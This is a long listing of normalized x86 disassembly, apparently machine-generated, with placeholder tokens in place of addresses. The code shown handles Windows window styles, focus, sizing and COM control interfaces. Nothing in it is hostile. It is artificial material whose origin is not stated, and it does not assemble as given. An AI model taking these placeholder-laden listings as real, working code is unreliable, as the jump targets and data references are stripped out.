cmp edx [ ebp + 0x8 ]
je r-xdata
and [ ebp + 0x8 ] 0x0
xor eax 0x1
mov [ ecx + 0x6c ] eax
mov ecx [ ecx + 0x4c ]
lea edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push r--data
push ecx
call [ eax ]
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
push 0xfffffd37
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_406af4
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ eax ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0xc ]
push edx
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
leave
retn 0x8
sub_406b5c
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
leave
retn 0x8
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_406bba
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi r--data
mov ebx ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x4c ]
xor edi edi
lea edx [ ebp - 0xc ]
mov [ ebp - 0xc ] edi
mov ecx [ eax ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
push 0x10
push r--data
push [ ebp + 0x8 ]
mov [ ebp - 0x14 ] edi
call sub_40ccd0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push 0x1
push eax
call [ ecx + 0x10 ]
mov eax [ ebp - 0xc ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
push 0x10
push r--data
push [ ebp + 0x8 ]
call sub_40ccd0
add esp 0xc
neg eax
sbb eax eax
pop edi
pop esi
pop ebx
neg eax
leave
retn 0x4
mov ebx [ ebx + 0x4c ]
lea ecx [ ebp - 0x14 ]
push ecx
push r--data
mov eax [ ebx ]
push ebx
call [ eax ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0xc ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0x30 ] di
jbe r-xdata
mov eax [ ebp - 0x4 ]
push [ ebp - 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x1c ]
push edx
push esi
mov ecx [ eax ]
push eax
call [ ecx + 0x24 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
inc esi
movzx eax [ eax + 0x30 ]
cmp esi eax
jb r-xdata
mov eax [ ebp - 0x1c ]
and eax 0x7
cmp al 0x3
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] edi
push edx
mov ecx [ eax ]
push esi
push eax
call [ ecx + 0x20 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x8 ]
push edx
push [ ebp - 0x20 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x38 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov esi [ ebp - 0x18 ]
mov edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
push [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4c ]
sub_406d34
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x10
push 0x0
lea esi [ edi + 0x74 ]
push esi
call sub_40cc70
mov edi [ edi + 0x4c ]
and [ ebp - 0x4 ] 0x0
add esp 0xc
lea ecx [ ebp - 0x4 ]
mov [ esi ] 0x10
mov eax [ edi ]
push ecx
push r--data
push edi
call [ eax ]
test eax eax
jl r-xdata
pop edi
pop esi
leave
retn
mov eax [ ebp - 0x4 ]
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_406d82
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
mov ax [ esi + 0x7c ]
cmp ax bx
je r-xdata
xor eax eax
cmp [ esi + 0x78 ] ebx
je r-xdata
movzx eax ax
push edi
lea eax [ eax + eax * 2 ]
shl eax 0x1
push eax
call sub_41b806
mov edi eax
pop ecx
movzx eax [ esi + 0x7c ]
push eax
push edi
push [ esi + 0x78 ]
call [ CopyAcceleratorTableA@IAT ]
cmp eax ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
jle r-xdata
push edi
call sub_41b82f
mov eax [ ebp - 0x8 ]
pop ecx
pop edi
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov ecx edi
mov esi [ edx + 0x4 ]
pop esi
pop ebx
leave
retn 0x4
and [ ebp + 0x8 ] 0x0
mov [ ebp + 0x8 ] 0x10
jmp r-xdata
inc [ ebp - 0x4 ]
add ecx 0x6
cmp [ ebp - 0x4 ] eax
jl r-xdata
mov bx [ ecx + 0x2 ]
cmp bx [ edx + 0x8 ]
je r-xdata
movzx ebx [ ecx ]
and ebx 0xfffffffd
cmp ebx [ ebp + 0x8 ]
jne r-xdata
cmp esi 0x106
jne r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
sub_406e25
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
test [ esi + 0x71 ] 0x40
jne r-xdata
mov eax [ esi + 0x4c ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
pop esi
jl r-xdata
mov eax [ esi ]
call [ eax + 0xac ]
leave
retn 0x4
mov eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_406e6d
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4c ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
leave
retn 0x4
mov eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_406ea3
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi ecx
lea edx [ ebp - 0x4 ]
push edx
mov eax [ esi + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
test eax eax
jl r-xdata
pop esi
leave
retn
mov eax [ ebp - 0x4 ]
cmp [ esi + 0x20 ] eax
je r-xdata
mov ecx [ esi + 0x24 ]
mov [ esi + 0x20 ] eax
test ecx ecx
je r-xdata
push eax
call sub_41cc10
mov eax [ esi + 0x24 ]
mov [ eax + 0x38 ] esi
sub_406ee0
push esi
mov esi ecx
mov ecx [ esi + 0x24 ]
and [ esi + 0x20 ] 0x0
test ecx ecx
je r-xdata
pop esi
retn
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ esi + 0x24 ]
and [ eax + 0x38 ] 0x0
mov eax [ ecx ]
push edi
call [ eax + 0x80 ]
mov edi eax
mov eax [ esi + 0x24 ]
push [ eax + 0x1c ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0x24 ]
call sub_41cc49
pop edi
cmp [ edi ] 0x0
je r-xdata
mov ecx [ esi + 0x24 ]
call sub_41f0f2
sub_406f2e
push esi
mov esi ecx
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x1c ]
push 0x0
push [ esp + 0xc ]
mov ecx [ eax + 0x1c ]
push 0xfffffffe
mov eax [ ecx ]
push [ esi + 0x28 ]
call [ eax + 0xc ]
mov eax [ ecx ]
push 0x0
push [ esp + 0xc ]
push 0xfffffffe
push [ esi + 0x28 ]
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
retn 0x4
sub_406f6b
push ebp
mov ebp esp
push ecx
cmp [ ecx + 0x58 ] 0x0
push esi
lea esi [ ecx + 0x58 ]
jne r-xdata
push [ ebp + 0x1c ]
mov ecx esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4254a8
mov ecx [ ecx + 0x4c ]
test ecx ecx
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ ecx ]
lea edx [ ebp - 0x4 ]
push edx
push r--data
push ecx
call [ eax ]
test eax eax
jl r-xdata
pop esi
leave
retn 0x18
push 0x1
mov ecx esi
push [ ebp - 0x4 ]
call sub_425475
sub_406fc1
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test ah 0x40
je r-xdata
push 0x8
pop edx
cmp ax dx
jne r-xdata
and eax 0xbfff
or al 0x40
test ah 0x80
je r-xdata
push 0xe
pop eax
xor edx edx
cmp ax 0x9
setne dl
dec edx
and edx 0x4
add edx 0x4
and eax 0x7fff
jmp r-xdata
push esi
push edi
push [ ebp + 0x10 ]
mov esi [ ecx ]
mov [ ebp + 0xe ] al
lea edi [ ebp + 0xe ]
xor eax eax
push edi
push eax
push eax
push edx
mov [ ebp + 0xf ] al
push [ ebp + 0x8 ]
call [ esi + 0x58 ]
pop edi
pop esi
pop ebp
retn 0xc
sub_40701c
push ebp
mov ebp esp
lea edx [ ebp + 0x20 ]
mov ecx [ ebp + 0x8 ]
push edx
push [ ebp + 0x1c ]
mov eax [ ecx ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x58 ]
pop ebp
retn
sub_40706f
mov eax sub_4262e0
call sub_40cc20
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov eax [ ecx ]
lea edx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] esp
and [ ebp - 0x4 ] 0x0
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x5c ]
mov [ ebp + 0x10 ] 0x1
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_4070c2
mov eax sub_4262ec
call sub_40cc20
sub esp 0x14
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push 0xfffffff0
push [ esi + 0x20 ]
mov [ ebp - 0x1c ] esi
call [ GetWindowLongA@IAT ]
and [ ebp - 0x4 ] 0x0
mov edi eax
mov eax [ esi ]
and edi 0x10000000
or edi [ esi + 0x6c ]
lea ecx [ ebp - 0x18 ]
push ecx
push 0xb
push 0xfffffdfe
mov ecx esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] 0x1
call [ eax + 0x64 ]
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov edx [ esi ]
and [ ebp - 0x18 ] 0x0
push 0x2
lea ecx [ ebp - 0x18 ]
pop eax
push ecx
push eax
push 0xfffffe08
mov ecx esi
mov [ ebp - 0x4 ] eax
call [ edx + 0x64 ]
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
or edi 0x8000000
mov [ ebp - 0x14 ] edi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x12 ] 0x80
sub_40712f
mov esi [ ebp - 0x1c ]
mov edx [ esi ]
and [ ebp - 0x18 ] 0x0
push 0x2
lea ecx [ ebp - 0x18 ]
pop eax
push ecx
push eax
push 0xfffffe08
mov ecx esi
mov [ ebp - 0x4 ] eax
call [ edx + 0x64 ]
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x12 ] 0x80
sub_407178
mov eax sub_4262f8
call sub_40cc20
sub esp 0x10
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push 0xffffffec
push [ esi + 0x20 ]
call [ GetWindowLongA@IAT ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
push ecx
push 0x2
push 0xfffffdf8
mov ecx esi
call [ eax + 0x64 ]
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x13 ] 0x2
sub_4071e0
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov eax ebx
mov esi ecx
push edi
mov edi [ esp + 0x14 ]
not eax
and eax [ esi + 0x6c ]
or eax edi
and eax [ esi + 0x68 ]
mov [ esi + 0x6c ] eax
mov eax 0x8000000
test eax ebx
jne r-xdata
mov ecx [ esi ]
mov edx edi
not edx
and edx eax
push edx
push 0xb
push 0xfffffdfe
push esi
call [ ecx + 0x6c ]
add esp 0x10
test eax eax
je r-xdata
test eax edi
je r-xdata
mov eax 0x800000
test eax ebx
jne r-xdata
mov eax 0xf7ffffff
and ebx eax
and edi eax
mov ecx [ esi ]
mov edx edi
and edx eax
push edx
push 0x2
push 0xfffffe08
push esi
call [ ecx + 0x6c ]
add esp 0x10
test eax eax
je r-xdata
test eax edi
je r-xdata
push [ esp + 0x18 ]
push edi
push ebx
push [ esi + 0x20 ]
call sub_41c863
pop edi
pop esi
pop ebx
retn 0xc
mov eax 0xff7fffff
and ebx eax
and edi eax
sub_407270
push ebp
mov ebp esp
mov eax 0x200
push esi
test [ ebp + 0x8 ] eax
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
jne r-xdata
mov ecx [ esi ]
mov edx edi
and edx eax
push edx
push 0x2
push 0xfffffdf8
push esi
call [ ecx + 0x6c ]
add esp 0x10
test eax eax
je r-xdata
test eax edi
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
push [ esi + 0x20 ]
call sub_41c87d
pop edi
pop esi
pop ebp
retn 0xc
mov eax 0xfffffdff
and [ ebp + 0x8 ] eax
and edi eax
sub_4072c0
push esi
mov esi ecx
push [ esp + 0x8 ]
mov eax [ esi ]
push 0x8
push 0xfffffdfa
push esi
call [ eax + 0x6c ]
add esp 0x10
test eax eax
jne r-xdata
pop esi
retn 0x4
push [ esp + 0x8 ]
mov eax [ esi ]
push 0x8
push 0xfffffdfb
push esi
call [ eax + 0x6c ]
add esp 0x10
sub_4072f3
mov eax sub_426304
call sub_40cc20
sub esp 0xc
push ebx
mov eax [ ecx ]
push esi
push edi
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
push 0x8
push 0xfffffdfa
call [ eax + 0x64 ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_407362
mov eax sub_426318
call sub_40cc20
push ecx
mov eax [ rw-data ]
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
push edx
call [ eax + 0x88 ]
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_41c358
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
sub_4073bd
mov eax sub_42632c
call sub_40cc20
push ecx
mov eax [ rw-data ]
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
push edx
call [ eax + 0x88 ]
mov eax [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi [ eax - 0x8 ]
call sub_41c358
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40740f
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
lea ebx [ ecx + 0x2c ]
push edi
mov esi ebx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] ecx
movsd [ edi ] [ esi ]
mov ecx [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
mov edi [ ebp + 0xc ]
mov esi [ SetRect@IAT ]
add eax edi
push eax
mov eax [ ebp + 0x8 ]
add ecx eax
push ecx
push edi
push eax
push ebx
call esi
mov ecx [ ebp - 0x4 ]
call sub_40619f
test eax eax
je r-xdata
lea esi [ ebp - 0x14 ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
add eax edi
push eax
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
add eax [ ebp + 0x8 ]
push eax
push edi
push [ ebp + 0x8 ]
push ebx
call esi
mov eax [ ebp - 0x4 ]
push ebx
push ebx
mov eax [ eax + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_407489
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov esi ecx
test bl 0x80
je r-xdata
mov eax ebx
and eax 0x3
cmp al 0x3
je r-xdata
mov eax [ esi ]
push 0x0
call [ eax + 0xa0 ]
test bl 0x40
je r-xdata
test bl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
and bl 0x3f
or ebx 0x3
test eax eax
je r-xdata
mov eax [ esi ]
push 0x5
mov ecx esi
call [ eax + 0xa0 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ esi + 0x2c ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x30 ]
jmp r-xdata
push ebx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ esi + 0x20 ]
call [ SetWindowPos@IAT ]
pop esi
pop ebx
leave
retn 0x18
mov eax [ eax + 0x1c ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x18 ]
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x38 ]
sub eax [ esi + 0x2c ]
sub ecx [ esi + 0x30 ]
jmp r-xdata
test bl 0x1
mov [ ebp + 0x1c ] eax
je r-xdata
push edi
mov edi ebx
not edi
shr edi 0x3
and edi 0x1
mov edx [ esi ]
push edi
push ecx
push eax
mov ecx esi
push [ ebp + 0x1c ]
push [ ebp - 0x4 ]
call [ edx + 0x98 ]
pop edi
sub_40753e
push esi
mov esi ecx
push edi
push [ esi + 0x20 ]
call [ IsWindowVisible@IAT ]
mov edi eax
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push 0xfffffffd
pop eax
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x3
jle r-xdata
mov edx [ esi ]
push 0x0
push eax
mov ecx esi
call [ edx + 0x54 ]
mov eax edi
pop edi
pop esi
retn 0x4
cmp eax 0x5
jg r-xdata
sub_40757d
mov eax sub_426338
call sub_40cc20
sub esp 0xc
mov eax [ ecx ]
push ebx
and [ ebp - 0x4 ] 0x0
push esi
push edi
lea edx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] esp
push edx
push 0xb
push 0xfffffdfe
mov [ ebp - 0x14 ] 0x1
call [ eax + 0x64 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_4075cb
mov eax sub_426344
call sub_40cc20
sub esp 0xc
push ebx
push esi
and [ ebp - 0x4 ] 0x0
mov esi ecx
push edi
lea ecx [ ebp - 0x14 ]
mov eax [ esi ]
mov [ ebp - 0x10 ] esp
push ecx
mov edi 0xfffffdfe
push 0xb
push edi
mov ecx esi
call [ eax + 0x64 ]
push [ ebp + 0x8 ]
mov eax [ esi ]
push 0xb
push edi
push esi
call [ eax + 0x68 ]
add esp 0x10
mov ecx [ ebp - 0xc ]
xor eax eax
cmp [ ebp - 0x14 ] eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
sete al
pop ebx
leave
retn 0x4
sub_407634
push esi
mov esi ecx
test [ esi + 0x71 ] 0x40
je r-xdata
push edi
call [ GetFocus@IAT ]
push eax
call sub_41cbcb
mov edi eax
mov eax [ esi ]
push 0x0
push 0xfffffffc
mov ecx esi
call [ eax + 0x54 ]
mov eax edi
pop edi
pop esi
retn
push [ esi + 0x20 ]
call [ SetFocus@IAT ]
push eax
call sub_41cbcb
pop esi
retn
sub_40766d
mov eax sub_42635a
call sub_40cc20
push ecx
push esi
mov esi ecx
cmp [ esi + 0x88 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push 0x5c
call sub_41b806
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push esi
call sub_407ecf
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx eax
mov [ esi + 0x88 ] eax
call sub_408258
sub_4076c1
push esi
mov esi ecx
push edi
mov eax [ esi + 0x90 ]
test eax eax
je r-xdata
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
mov ecx [ eax + 0x88 ]
push 0x0
push esi
mov eax [ ecx ]
call [ eax + 0x8 ]
mov eax [ esi + 0x90 ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0xc ]
and [ esi + 0x90 ] 0x0
pop edi
pop esi
retn 0x10
mov ecx [ edi + 0x38 ]
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov eax [ edi + 0x38 ]
push [ esp + 0x14 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0x10 ]
mov [ esi + 0x94 ] eax
lea ecx [ esi + 0x9c ]
movzx eax [ esp + 0x14 ]
mov [ esi + 0x98 ] eax
call sub_41c49d
mov eax [ esi + 0x90 ]
push 0x1
push esi
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov esi [ esi + 0x90 ]
test esi esi
je r-xdata
mov ecx [ esi + 0x88 ]
mov eax [ ecx ]
call [ eax + 0xc ]
sub_407763
mov eax sub_42636e
call sub_40cc20
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov esi ecx
cmp edi ebx
je r-xdata
mov edi [ esi + 0x8c ]
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov ecx edi
call sub_40a59f
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
je r-xdata
push 0x1c
call sub_41b806
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ edi + 0x8 ] eax
jne r-xdata
xor eax eax
push ebx
push [ ebp + 0x8 ]
push [ esi + 0x8c ]
call sub_40a55c
jmp r-xdata
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov eax [ eax + 0x38 ]
cmp eax [ edi + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x10 ]
test ecx ecx
je r-xdata
mov [ esi + 0x8c ] eax
mov ecx [ edi + 0x38 ]
mov [ eax + 0xc ] ecx
mov eax [ esi + 0x8c ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] esi
mov eax [ esi + 0x8c ]
mov ecx [ eax + 0xc ]
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov esi [ esi + 0x8c ]
push 0x1
push esi
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
jmp r-xdata
mov [ esi + 0x8c ] ebx
mov [ eax + 0x18 ] ebx
jmp r-xdata
test ebx ebx
mov edi ebx
jne r-xdata
call sub_40a59f
mov [ ebp - 0x10 ] eax
test edi edi
je r-xdata
mov ecx [ eax + 0x88 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push edi
call sub_41b82f
pop ecx
mov eax [ ecx ]
push 0x0
push edi
call [ eax + 0x4 ]
sub_407926
mov eax [ esp + 0x4 ]
mov eax [ eax - 0xa0 ]
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
neg eax
sbb eax eax
and eax 0x7fffbffb
add eax 0x80004005
retn 0x8
mov eax [ eax + 0x1c ]
sub_407968
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
mov ecx [ edi - 0xa0 ]
lea esi [ edi - 0xa0 ]
push r--data
call sub_42420f
test eax eax
jge r-xdata
and [ eax ] 0x0
mov eax [ esi ]
add edi 0xffffff70
push edi
push [ ebp + 0x14 ]
mov esi [ eax + 0x1c ]
call [ CopyRect@IAT ]
push [ ebp + 0x18 ]
push [ esi + 0x1c ]
call [ GetClientRect@IAT ]
mov eax [ ebp + 0x1c ]
and [ eax + 0x4 ] 0x0
test esi esi
je r-xdata
mov eax 0x80004005
jmp r-xdata
and [ eax + 0xc ] 0x0
and [ eax + 0x10 ] 0x0
mov [ eax + 0x8 ] esi
xor eax eax
mov esi [ esi + 0x1c ]
pop edi
pop esi
pop ebp
retn 0x18
sub_407a23
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov ebx [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x20 ]
push edi
push eax
mov eax [ ebx - 0xa0 ]
mov eax [ eax + 0x1c ]
push [ eax + 0x1c ]
call [ GetClientRect@IAT ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call [ CopyRect@IAT ]
lea eax [ ebx - 0x90 ]
lea esi [ ebp - 0x10 ]
mov edi eax
mov ebx [ ebx - 0x6c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
mov ecx [ ebx ]
push edx
push eax
push ebx
call [ ecx + 0x1c ]
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_407ad1
